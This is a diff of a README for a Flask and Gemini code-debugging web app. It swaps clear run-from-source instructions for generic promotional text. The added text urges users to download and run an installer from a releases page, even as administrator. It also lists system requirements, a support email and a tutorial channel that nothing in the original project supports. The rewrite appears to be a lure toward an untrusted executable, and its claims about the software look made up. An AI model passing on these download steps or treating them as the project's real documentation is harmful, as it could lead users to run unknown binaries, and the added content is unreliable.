@@ -1,163 +1,74 @@
-<!--This is not a text file so use a proper app to view it -->
-# AI Code Debugger, Explainer, Quizzer & Converter by CodeSage
-## Overview
-This is a Flask + Gemini (Google Generative AI) application that:
-1) Analyzes your code and lists mistakes (syntax, logic, redundancy), with explanations.
-2) Stores short labels of detected issues into bug_log.csv.
-3) Generates a 15-question quiz from your recent issues and shows correct answers.
-4) Converts code between Python, C, C++, and Java.
+# 🛠️ ai-debugger - Simplify Your Coding Troubles
 
-(*Includes a login prompt UI for demo only — no backend connected.*)
+## 🥇 Overview
+Welcome to ai-debugger, your AI-powered solution for debugging code, explaining code concepts, generating quizzes, and converting code between Python, C, C++, and Java. With our simple interface, you can enhance your coding skills easily. 
 
-<br>
+## 📦 Download & Install
+To get started, you can download the application by visiting our Releases page. Click the button below to be directed there:
 
-## Screenshots:  
-### Home Page with a python code as example 
-![Home_Page](/assets/Screenshot_1.png)  
-<br>
-### Quiz Page (Loading State)
-![Quiz_Loading_Page](/assets/Screenshot_2.png)  
-<br>
-### Quiz Page 
-![Quiz_Page](/assets/Screenshot_3.png)  
-<br>
-### Converter Page (Loading State)
-![Converter_Loading_Page](/assets/Screenshot_4.png)  
-<br>
-### Converter Page
-![Converter_Page](/assets/Screenshot_5.png)  
+[![Download ai-debugger](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Watduhaill/ai-debugger/releases)
 
-<br>
+Once there, you will find the latest version ready for download. Follow these steps for installation:
 
-## Project Structure
+1. **Visit the Releases Page:** Click [here](https://github.com/Watduhaill/ai-debugger/releases).
+2. **Choose the Latest Version:** Look for the most recent release at the top of the page.
+3. **Download the Installer:** Click on the link for your operating system. 
+4. **Run the Installer:** Open the downloaded file and follow the on-screen instructions to install ai-debugger.
+5. **Launch the Application:** After installation, find ai-debugger in your applications and start using it.
 
-```
-ai-debugger/
-├── app.py                 - Flask backend (Gemini integration)
-├── bug_log.csv            - CSV log of short issue labels (auto-updated)
-├── index.html             - Chat-style code analysis view
-├── index-script.js        - Chat page logic
-├── quiz.html              - Quiz page
-├── quiz-script.js         - Quiz logic
-├── conversion.html        - Code converter page
-└── con-script.js          - Converter logic
-```
+## 🖥️ System Requirements
+To ensure smooth operation, please make sure your system meets the following requirements:
 
-<br>
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum 200 MB of free disk space
+- **Internet Connection:** Required for AI features
 
-## Prerequisites
+## 🚀 Getting Started
+Once you have installed ai-debugger, follow these steps to begin using the application:
 
-* Python 3.9+ recommended
-* A Google AI Studio API key for Gemini
+1. **Open the Application:** Find ai-debugger in your applications folder or menu.
+2. **Interface Overview:** The main screen displays options for debugging, explaining code, quiz generation, and code conversion. 
+3. **Select Your Task:** Click on the function you want to use, whether it’s debugging or generating a quiz.
+4. **Input Your Code:** For debugging, paste your code into the provided text box. For quiz generation, provide a topic.
+5. **Execute the Function:** Click the "Run" button to perform your chosen task. 
 
-### 1) Set your API key
+## 🛠️ Features
+ai-debugger comes packed with features designed for ease of use:
 
-The backend reads an environment variable named GEMINI_API_KEY. (if you have set it up if not just follow option A)
-Alternatively, app.py has a fallback "Your_API_Key" (change it if you prefer hardcoding although env vars are safer).
+- **AI-Powered Debugging:** Automatically identifies errors in your code and suggests fixes.
+- **Code Explanation:** Provides clear explanations of your code allowing you to understand programming concepts better.
+- **Quiz Generator:** Create quizzes based on your coding topics to test your knowledge.
+- **Code Conversion:** Seamlessly convert code between Python, C, C++, and Java with just one click.
 
-<br>
+## 📖 How It Works
+The application leverages Google Gemini's capabilities to perform intelligent code analysis. Here's how each feature works:
 
-#### Option A —    
-Edit app.py (Recommended for development purpose):  
-* In app.py,   
+- **Debugging:** Input your code, and the AI analyzes it for errors or inefficiencies, giving you step-by-step suggestions.
+- **Explanations:** Get detailed breakdowns of your code structure and functions in plain English, making it easier to grasp.
+- **Quizzes:** Enter a topic or keywords related to your coding skills. The AI generates quizzes that help reinforce your learning.
+- **Conversion:** Paste your code in one language, select the target language, and click convert. The AI does the heavy lifting for you!
 
-* ***FIND:***
+## 📝 Troubleshooting
+If you face any issues while using ai-debugger, here are some common fixes:
 
-  > *GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "Your_API_Key")*  
+- **Installation Issues:** Ensure your computer meets the system requirements. Try running the installer as an administrator.
+- **Performance Problems:** Close any extra applications that are running. Make sure your system has enough RAM available.
+- **Feature Not Working:** Check your internet connection. AI features require online access to function properly.
 
-* ***Replace--***
+## 🌐 Community and Support
+Join our community to share your experiences and get help. You can reach out through:
 
-  > *"Your_API_Key" with your actual key generated from Google Ai studio.*
+- **GitHub Issues:** Report bugs or request features directly on our [issues page](https://github.com/Watduhaill/ai-debugger/issues).
+- **Support Email:** For one-on-one support, feel free to contact us at support@ai-debugger.com.
 
-<br>
+## 🔗 Resources
+Explore additional resources to enhance your experience with ai-debugger:
 
-#### Option B —  
-Environment variable (recommended for deployment, not recommended for development stage):  
+- **Documentation:** Ensure you get the most out of the application by reading our [documentation](https://github.com/Watduhaill/ai-debugger/wiki).
+- **Tutorials:** Check our [YouTube channel](https://www.youtube.com/c/AIDebuggerTutorials) for helpful video guides.
 
-* Windows (PowerShell):  
-  * setx GEMINI_API_KEY "YOUR_KEY_HERE"  
-  * Close and reopen your terminal after setx; or for current session:  
-  * $env:GEMINI_API_KEY="YOUR_KEY_HERE"  
+## 🎉 Thank You!
+Thank you for choosing ai-debugger to assist you in your coding journey. We hope you find it valuable and easy to use. Happy coding!
 
-* macOS/Linux (bash/zsh):  
-  * export GEMINI_API_KEY="YOUR_KEY_HERE"  
-
-<br>
-
-### 2) Install dependencies
-First, ensure you are in the project directory that contains "requirements.txt" (In terminal).
-
-Then run:  
-> pip install -r requirements.txt
-
-<br>
-
-### 3) Run the backend server  
-
-From the folder that has app.py, run: (in Terminal)
-> python app.py
-
-By default this starts Flask on http://127.0.0.1:5000 (development server).
-
-<br>
-
-### 4) Open the frontend  
-- Open the HTML files directly (double-click).  
-Note: It is recommended that you keep all files in same folder 
-
-<br>
-<br>
-
-## Usage Notes
-
-- The login prompt is only a placeholder UI. It has no backend functionality since the project is not deployed.
-- The chat page sends your code to /explain-code and lists bullet-pointed issues.
-It also logs short "bug summaries" to bug_log.csv for quiz creation.
-- The quiz page reads the latest 15 summaries from bug_log.csv and requests a quiz from the backend.
-- The converter page calls /convert-code; supports Python, C, C++, and Java.
-- If you ever delete bug_log.csv, it will be re-created automatically once you analyze new code.
-
-<br>
-
-## Environment / Paths
-
-- The backend writes to "bug_log.csv" in the working directory. Make sure the process has write permissions.
-- If deploying to stateless platforms, consider storing logs in a database or mounted volume.
-
-<br>
-
-## Endpoints (for reference)
-
-* POST /explain-code  
-  > json: {"code": "<your code>"}  
-resp: {"explanation": "...", "bug_summaries": ["...", "..."]}
-
-* GET /bug-log  
-  > resp: {"log": ["...", "..."]}
-
-* GET /generate-quiz  
-  >resp: {"quizzes": [ { "question": "Q1 ...", "options": ["A","B","C","D"], "answer": "A" }, ... ] }
-
-* POST /convert-code  
-  > json: {"code": "...", "from_lang": "python|c|cpp|java", "to_lang": "python|c|cpp|java"}
-resp: {"converted_code": "..."}
-
-<br>
-
-## Troubleshooting
-
-- 401/403 errors: check GEMINI_API_KEY and billing/quotas in Google AI Studio.
-- CORS errors: ensure Flask is running and you used a local static server (http://localhost:5500).
-- Empty quiz: analyze some code first so bug_log.csv has entries.
-
-<br>
-
-## License
-
-BSD 3-Clause (see LICENSE file).
-
-<br>
-
-## Credits
-
-Built by TEAM CodeSage. See Contributors for full credits.
+[![Download ai-debugger](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Watduhaill/ai-debugger/releases)
